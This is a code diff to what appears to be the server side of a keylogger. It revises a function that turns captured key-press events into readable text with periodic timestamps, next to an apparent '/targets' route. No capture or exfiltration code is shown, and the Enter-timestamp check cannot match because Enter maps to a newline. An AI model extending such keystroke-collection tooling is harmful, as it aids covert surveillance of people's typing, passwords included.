@@ -24,7 +24,7 @@ from datetime import datetime
 def parse_logs(raw_logs: str) -> str:
     key_mapping = {
         "Key.space": " ",
-        "Key.enter": "\n",  # Newline on Enter
+        "Key.enter": "\n",  # Newline for enter
         "Key.tab": "[TAB]",
         "Key.backspace": "[BACKSPACE]",
         "Key.ctrl_l": "[CTRL]",
@@ -59,19 +59,24 @@ def parse_logs(raw_logs: str) -> str:
     }
 
     readable_logs = []
+    key_count = 0  # Keep track of the number of keys
+
+    # Split the raw logs into lines
     for log in raw_logs.splitlines():
-        # Map the raw key press to a readable key
+        # Map each log to a readable key
         if log in key_mapping:
             readable_logs.append(key_mapping[log])
         else:
-            # For printable characters, just clean up the quotes
-            readable_logs.append(log.strip("'"))
-        
-        # Add timestamp and format
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        readable_logs.append(f" [{timestamp}]")  # Append timestamp
+            readable_logs.append(log.strip("'"))  # Clean up the quotes
 
-    # Join the logs into a single string and return
+        key_count += 1
+
+        # Add a timestamp after every 10 keys or after a key event like Enter
+        if key_count % 10 == 0 or "[ENTER]" in readable_logs[-1]:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            readable_logs.append(f" [{timestamp}]")  # Add timestamp after every 10 keys or Enter
+
+    # Join the logs into a single string for output
     return "".join(readable_logs)
 
 @app.get("/targets")
